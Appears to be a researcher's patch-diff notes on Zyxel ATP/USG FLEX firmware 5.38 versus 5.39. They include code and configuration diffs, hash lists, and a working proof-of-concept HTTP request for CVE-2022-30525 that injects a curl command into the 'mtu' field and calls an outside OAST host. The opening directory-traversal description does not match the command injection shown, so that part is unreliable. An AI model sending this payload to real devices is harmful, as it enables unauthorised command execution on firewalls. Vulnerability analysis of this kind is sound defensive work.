# Description

The vulnerability allows a remote attacker to perform directory traversal attacks.

The vulnerability exists due to input validation error when processing directory traversal sequences. A remote attacker can send a specially crafted HTTP request and read arbitrary files on the system.

# Mitigation
Install update from vendor's website.

# Vulnerable software versions

- ATP series: 5.00 - 5.38
- USG FLEX series: 5.00 - 5.38
- USG FLEX 50W: 5.10 - 5.38
- USG20W-VPN: 5.10 - 5.38

# diff

```
/home/sysirq/Work/Firmware/Zyxel/ATP100_5.39/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/ztputil.py
/home/sysirq/Work/Firmware/Zyxel/ATP100_5.39/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/ztpinclude.py
/home/sysirq/Work/Firmware/Zyxel/ATP100_5.39/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/ztp_bg.py
/home/sysirq/Work/Firmware/Zyxel/ATP100_5.39/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/lib_usb_setting.py
/home/sysirq/Work/Firmware/Zyxel/ATP100_5.39/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/ztpdbglevel.py
/home/sysirq/Work/Firmware/Zyxel/ATP100_5.39/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/ztp_reg.py
/home/sysirq/Work/Firmware/Zyxel/ATP100_5.39/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/vpn_certificate.py
/home/sysirq/Work/Firmware/Zyxel/ATP100_5.39/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/lib_cmd_language.py
/home/sysirq/Work/Firmware/Zyxel/ATP100_5.39/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/lib_cmd_pcap.py
/home/sysirq/Work/Firmware/Zyxel/ATP100_5.39/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/lib_wan_setting.py
/home/sysirq/Work/Firmware/Zyxel/ATP100_5.39/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/handler.py
/home/sysirq/Work/Firmware/Zyxel/ATP100_5.39/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/lib_remote_assist.py
/home/sysirq/Work/Firmware/Zyxel/ATP100_5.39/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/errorcode.py
/home/sysirq/Work/Firmware/Zyxel/ATP100_5.39/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/lib_cmd_devinfo.py
/home/sysirq/Work/Firmware/Zyxel/ATP100_5.39/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/lib_cmd_interface.py
/home/sysirq/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/ztputil.py
/home/sysirq/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/ztpinclude.py
/home/sysirq/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/ztp_bg.py
/home/sysirq/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/lib_usb_setting.py
/home/sysirq/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/ztpdbglevel.py
/home/sysirq/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/ztp_reg.py
/home/sysirq/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/vpn_certificate.py
/home/sysirq/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/lib_cmd_language.py
/home/sysirq/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/lib_cmd_pcap.py
/home/sysirq/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/lib_wan_setting.py
/home/sysirq/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/handler.py
/home/sysirq/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/lib_remote_assist.py
/home/sysirq/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/errorcode.py
/home/sysirq/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/lib_cmd_devinfo.py
/home/sysirq/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/lib_cmd_interface.py
sysirq@debian:~$ diff /home/sysirq/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/ztputil.py /home/sysirq/Work/Firmware/Zyxel/ATP100_5.39/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/ztputil.py
sysirq@debian:~$ diff /home/sysirq/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/ztpinclude.py /home/sysirq/Work/Firmware/Zyxel/ATP100_5.39/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/ztpinclude.py
sysirq@debian:~$ diff /home/sysirq/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/ztp_bg.py /home/sysirq/Work/Firmware/Zyxel/ATP100_5.39/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/ztp_bg.py
sysirq@debian:~$ diff /home/sysirq/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/lib_usb_setting.py /home/sysirq/Work/Firmware/Zyxel/ATP100_5.39/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/lib_usb_setting.py
sysirq@debian:~$ diff /home/sysirq/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/ztpdbglevel.py /home/sysirq/Work/Firmware/Zyxel/ATP100_5.39/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/ztpdbglevel.py
sysirq@debian:~$ diff /home/sysirq/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/ztp_reg.py /home/sysirq/Work/Firmware/Zyxel/ATP100_5.39/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/ztp_reg.py
sysirq@debian:~$ diff /home/sysirq/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/vpn_certificate.py /home/sysirq/Work/Firmware/Zyxel/ATP100_5.39/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/vpn_certificate.py
sysirq@debian:~$ diff /home/sysirq/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/lib_cmd_language.py /home/sysirq/Work/Firmware/Zyxel/ATP100_5.39/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/lib_cmd_language.py
sysirq@debian:~$ diff /home/sysirq/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/lib_cmd_pcap.py /home/sysirq/Work/Firmware/Zyxel/ATP100_5.39/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/lib_cmd_pcap.py
sysirq@debian:~$ diff /home/sysirq/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/lib_wan_setting.py /home/sysirq/Work/Firmware/Zyxel/ATP100_5.39/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/lib_wan_setting.py
sysirq@debian:~$ diff /home/sysirq/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/handler.py /home/sysirq/Work/Firmware/Zyxel/ATP100_5.39/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/handler.py
1555,1556c1555,1557
< supported_cmd = ["ping", "dnsanswer", "ps", "peek", "kill", "traceroute", \
<                  "atraceroute", "iptables", "getorchstat", \
---
> supported_cmd = ["ping", "traceroute", \
>                  # "ping", "dnsanswer", "ps", "peek", "kill", "traceroute", \
>                  # "atraceroute", "iptables", "getorchstat", \
1558,1559c1559,1560
<                  #"getSingleInterfaceInfo", "getAllInterfaceInfo", \
<                  #"getInterfaceNameAll", "getInterfaceNameMapping", \
---
>                  # "getSingleInterfaceInfo", "getAllInterfaceInfo", \
>                  # "getInterfaceNameAll", "getInterfaceNameMapping", \
1564c1565,1566
<                  "getWanPortList", "getWanPortSt", "setWanPortSt", "getZTPurl", "getWanConnSt", \
---
>                  # "getWanPortList", "getWanPortSt", "setWanPortSt", "getZTPurl", "getWanConnSt", \
>                  "getWanPortList", "getWanPortSt", "setWanPortSt", "getWanConnSt", \
1626,1645c1628,1647
<     elif req["command"] == "atraceroute":
<         if not "dest" in req:
<             raise Exception("invalid req")
<         reply = doasynctraceroute(req["dest"])
<     elif req["command"] == "dnsquery":
<         reply = dosyncdnsquery(req)
<     elif req["command"] == "iptables":
<         reply = dolistiptables(req["iptables"])
<     elif req["command"] == "ps":
<         reply = listtask()
<     elif req["command"] == "peek":
<         if not "id" in req:
<             raise Exception("invalid req")
<         reply = peektask(req["id"])
<     elif req["command"] == "kill":
<         if not "kill" in req:
<             raise Exception("invalid req")
<         reply = killtask(req["kill"]["id"], **req["kill"])
<     elif req["command"] == "getorchstat":
<         reply = getorchstat()
---
>     # elif req["command"] == "atraceroute":
>     #    if not "dest" in req:
>     #        raise Exception("invalid req")
>     #    reply = doasynctraceroute(req["dest"])
>     # elif req["command"] == "dnsquery":
>     #    reply = dosyncdnsquery(req)
>     # elif req["command"] == "iptables":
>     #    reply = dolistiptables(req["iptables"])
>     # elif req["command"] == "ps":
>     #    reply = listtask()
>     # elif req["command"] == "peek":
>     #    if not "id" in req:
>     #        raise Exception("invalid req")
>     #    reply = peektask(req["id"])
>     # elif req["command"] == "kill":
>     #    if not "kill" in req:
>     #        raise Exception("invalid req")
>     #    reply = killtask(req["kill"]["id"], **req["kill"])
>     # elif req["command"] == "getorchstat":
>     #    reply = getorchstat()
1661c1663
<     #elif req["command"] == "getInterfaceNameAll":
---
>     # elif req["command"] == "getInterfaceNameAll":
1663c1665
<     #elif req["command"] == "getSingleInterfaceInfo":
---
>     # elif req["command"] == "getSingleInterfaceInfo":
1667c1669
<     #elif req["command"] == "getAllInterfaceInfo":
---
>     # elif req["command"] == "getAllInterfaceInfo":
1669c1671
<     #elif req["command"] == "getInterfaceNameMapping":
---
>     # elif req["command"] == "getInterfaceNameMapping":
1679c1681
<     #elif req["command"] == "setRemoteAssistActive":
---
>     # elif req["command"] == "setRemoteAssistActive":
1683c1685
<     #elif req["command"] == "getRemoteAssist":
---
>     # elif req["command"] == "getRemoteAssist":
1697,1698c1699,1700
<     elif req["command"] == "getZTPurl":
<         reply = lib_wan_setting.showZTPurl()
---
>     # elif req["command"] == "getZTPurl":
>     #    reply = lib_wan_setting.showZTPurl()
sysirq@debian:~$ diff /home/sysirq/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/lib_remote_assist.py /home/sysirq/Work/Firmware/Zyxel/ATP100_5.39/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/lib_remote_assist.py
sysirq@debian:~$ diff /home/sysirq/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/errorcode.py /home/sysirq/Work/Firmware/Zyxel/ATP100_5.39/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/errorcode.py
sysirq@debian:~$ diff /home/sysirq/Work/Firmware/Zyxel/ATP100_5.39/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/lib_cmd_devinfo.py /home/sysirq/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/lib_cmd_devinfo.py
sysirq@debian:~$ diff /home/sysirq/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/lib_cmd_interface.py /home/sysirq/Work/Firmware/Zyxel/ATP100_5.39/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/htdocs/ztp/cgi-bin/lib_cmd_interface.py
sysirq@debian:~$ 

```


CVE-2022-30525 POC

```
POST /ztp/cgi-bin/handler HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Connection: close
Content-Type: application/json
Accept-Encoding: gzip

{"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged":"1","vlanid":"5","mtu":"; curl `id`.cbc2oelmk1u41mao0f10zeoez9n56xp8c.oast.live;","data":"hi"}
```

iptables 疑似存在 命令注入
peek 疑似任意文件读取，但是写死了？


# bindiff

```
sysirq@debian:~/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui$ find . -name "*.cgi" -exec sha256sum {} \;
569efebffda7508384d35da9de0a87551b1930be98619640af542eddc47e3369  ./cgi-twofa/2FA-access.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_MBKA.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_SANDBOX.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_EXU.cgi
b5e716980438f0bfc592b9c8b902596063ace3d6f158ea8429374a7d2ffe5c1c  ./htdocs/chg_exp_pwd.cgi
c770016176df0c27fd5d8978533c7b7b663e4736f5872bce78fb3d9ced746b29  ./htdocs/webauth_relogin.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_IDP.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_registration.cgi
7046a633fdc349556c9d392ad4297d84d3c477cd071dd139a9b1e5e318142727  ./htdocs/redirect.cgi
ed58f7b2e6c643a1aea2ac9a839027191601042aaf991df6240a4a6c7c1574fb  ./htdocs/agree.cgi
674f2d00b752de2174e4e5393139de70ad84947c2db61665966a8a68d571e079  ./htdocs/setuser.cgi
29ce33cb19e95b0b778e25d594a66e40a5975cecc20241378ae6d9b787cc23ae  ./htdocs/webauth_example_preview.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_NWE.cgi
a9084074f5d916272e4b89c7e3be69fce69edf9cfcc71c1e5daae9f1e553ea0e  ./htdocs/fetch_ap_info.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_CCF.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_SSLVPN.cgi
c72cb45e9a414ff93e7ac92df1ae5dd9b5846ce57ac36906d68b71955d22ea92  ./htdocs/weblogin.cgi
27167f046be7306b23ed1aea9f68f69c88f4a04faad64474b437df7dd463909e  ./htdocs/access.cgi
219d9cc310f32a90a812bfc81308815e9e749fce39352b7a1b0db80c54597594  ./htdocs/walled_garden.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_NWPM.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_HOTS.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_AV.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_quickmode.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_GEOIP.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_TSP.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_RF.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_CDR.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_SECUR.cgi
76c0a7147555a8ba44d7346a8c07d6870d1e982a847bd623a33a580a4fa70215  ./htdocs/check_need_wizard.cgi
30079598e9dcc396b8afb675810b3faec11f11fe3bd7e6056621b0128040cd9b  ./htdocs/webauth_ga.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_APC.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_HA.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_APPQM.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_HOTSQ.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_WEBSEC.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_extend.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_AS.cgi
471b65255d9e52ebfa430d7be8a444e528d8aa05ef3acbb57f9df2912dd9c4ae  ./htdocs/webauth_error.cgi
026d41f8acf31d8715bf16353534f213931fcac95c855ffd4947f52dff83be1b  ./htdocs/securpt.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_ZYMESH.cgi
84eea16e93f7faa5ca61a720f8bc9b7f14df9d14bd0993533afb66f52e5ac5e5  ./htdocs/dynamic_script.cgi
569efebffda7508384d35da9de0a87551b1930be98619640af542eddc47e3369  ./cgi-twofa/2FA-access.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_MBKA.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_SANDBOX.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_EXU.cgi
b5e716980438f0bfc592b9c8b902596063ace3d6f158ea8429374a7d2ffe5c1c  ./htdocs/chg_exp_pwd.cgi
c770016176df0c27fd5d8978533c7b7b663e4736f5872bce78fb3d9ced746b29  ./htdocs/webauth_relogin.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_IDP.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_registration.cgi
7046a633fdc349556c9d392ad4297d84d3c477cd071dd139a9b1e5e318142727  ./htdocs/redirect.cgi
ed58f7b2e6c643a1aea2ac9a839027191601042aaf991df6240a4a6c7c1574fb  ./htdocs/agree.cgi
674f2d00b752de2174e4e5393139de70ad84947c2db61665966a8a68d571e079  ./htdocs/setuser.cgi
29ce33cb19e95b0b778e25d594a66e40a5975cecc20241378ae6d9b787cc23ae  ./htdocs/webauth_example_preview.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_NWE.cgi
a9084074f5d916272e4b89c7e3be69fce69edf9cfcc71c1e5daae9f1e553ea0e  ./htdocs/fetch_ap_info.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_CCF.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_SSLVPN.cgi
c72cb45e9a414ff93e7ac92df1ae5dd9b5846ce57ac36906d68b71955d22ea92  ./htdocs/weblogin.cgi
27167f046be7306b23ed1aea9f68f69c88f4a04faad64474b437df7dd463909e  ./htdocs/access.cgi
219d9cc310f32a90a812bfc81308815e9e749fce39352b7a1b0db80c54597594  ./htdocs/walled_garden.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_NWPM.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_HOTS.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_AV.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_quickmode.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_GEOIP.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_TSP.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_RF.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_CDR.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_SECUR.cgi
76c0a7147555a8ba44d7346a8c07d6870d1e982a847bd623a33a580a4fa70215  ./htdocs/check_need_wizard.cgi
30079598e9dcc396b8afb675810b3faec11f11fe3bd7e6056621b0128040cd9b  ./htdocs/webauth_ga.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_APC.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_HA.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_APPQM.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_HOTSQ.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_WEBSEC.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_extend.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_AS.cgi
471b65255d9e52ebfa430d7be8a444e528d8aa05ef3acbb57f9df2912dd9c4ae  ./htdocs/webauth_error.cgi
026d41f8acf31d8715bf16353534f213931fcac95c855ffd4947f52dff83be1b  ./htdocs/securpt.cgi
878b73deafa72613cf9b7fdbe35e3fff9e916569d107b5a88dfd29cb8660bc58  ./htdocs/myzyxel_ZYMESH.cgi
5e38e77b9f02a21d83c15416793e6fb014608cc181c41d1ee44718ef28d4a964  ./htdocs/dynamic_script.cgi
```

更改的文件有：

```
/htdocs/dynamic_script.cgi
```

# httpd.conf 文件diff

```
sysirq@debian:~/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root$ diff /home/sysirq/Work/Firmware/Zyxel/ATP100_5.38/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/httpd.conf /home/sysirq/Work/Firmware/Zyxel/ATP100_5.39/root/compress.img/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/httpd.conf
160,166d159
< <Directory "/usr/local/zyxel-gui/htdocs/ztp/cgi-bin">
<   <IfModule mod_rewrite.c>
<     Options ExecCGI FollowSymLinks
<     AllowOverride None
<     RewriteRule ^([^\.]+)/?$ $1.py [L]
<   </IfModule>
< </Directory>

```

# mod diff

```
47ad43a5564c8e6d1547834c37d1d745c2efa3fa45e4a6ec100eea2b79073763  httpd.exp
243909177c8220b0b5d61e14c0966527d0aad8dd02c41a71c0f548942895815f  mod_allowmethods.so
a855d02618b04adf94d672be7d73c04ac8af227710c04f8628b4674b4c523deb  mod_auth_digest.so
a162be34d3d4edc4c5f47986a0c45d26765b0a21f3e97aadbeca88c90529f26b  mod_auth_form.so
c1e2fa315dca45f7133468386d44f017fa79cbe5491cc33ebd91805c08dbcbec  mod_authn_anon.so
827d6ce164f42d7ae8ad1dbd445e6afce8aabcc6dfbec8c07b05c705a77c2533  mod_authn_dbd.so
60fd4cfef4f531d4aef9f82d895ca4cac9be6d86fabbc939061c536fc9b68383  mod_authn_dbm.so
4423bcb422147d7b2e7a3a001ddeea2d155955904ad180fa5fe299baf407d9e1  mod_authn_socache.so
01b7bcb97fd179b4d3c59ae93352eaf195b132e495544f17c688897d6e239450  mod_authz_dbd.so
027eacdf459d1b9545306b21199bd8b613e0d7f7da95df55dfee2edcacab5863  mod_authz_dbm.so
7071ce23a2acc3f1ab618c27e84e88283ca8ca56c099d67e6529a9ed456277f3  mod_authz_owner.so
40826b8d87f0962d514e610e816fa511aec6bd15fafba8e77d0fade36da0c707  mod_auth_zyxel.so
90c2fb5ec64dae201784a7d6750454f3511bcecd55b67341b7020b1f3d7eec06  mod_buffer.so
ba8c49a7150cb93224047ba64439461b3dd05c925a98b413cd40de8291bd6bd2  mod_cache_disk.so
c3d3ff55f5f045e9d21e86448690a71424bd7f83e8a0df4cb1f9b9fae5b8aab5  mod_cache.so
ed7d1bc0ae7311a9b9962cf0ed022888a8d76802de1a2ee6bca4c154753190df  mod_cache_socache.so
85f4e96adac757b7c77509c7615ca605baf8fde17c0f0583cb1bfa7b66da584f  mod_dav_fs.so
552895ffc26aef9d1ea0557f75afb35dc446ac32892bb7f385f87c19cf0dbdfa  mod_dav.so
ec3f73f2745c1f1f93b9ab160f0099b51aee4f25d980175a730ed9f51cc4d0fc  mod_dbd.so
a64bf94345360e554c3f59ff560a03ac23a70aafe70d3f8bb58c33df3c66eb90  mod_dumpio.so
628e2dbe3402013bab8d8fce4ab07ebbde647a0f495f13826eb474d63e0ae8a8  mod_ext_filter.so
a6483a5d0d58c0e38e43cf5c5ecad39cde9a227ee2ab5616213b230ba92b2fce  mod_file_cache.so
79f3bac8e25c7dee13b4b56bbb0597889a9243c1a2c9949a51c5208cc9afe149  mod_info.so
cee2f5261ced0e7f7bf4d0576b384040c58ed07cb6bd80710098f960aa1f7100  mod_log_debug.so
026404e4b6799e57a77c1767c9f1d807bd1728f020c2db93e0e6619bc26b32ff  mod_logio.so
1e231ad7c911a0eef1b5a8b4b4df44a68b27e9cd6b9dfc6611dbff305a76123d  mod_macro.so
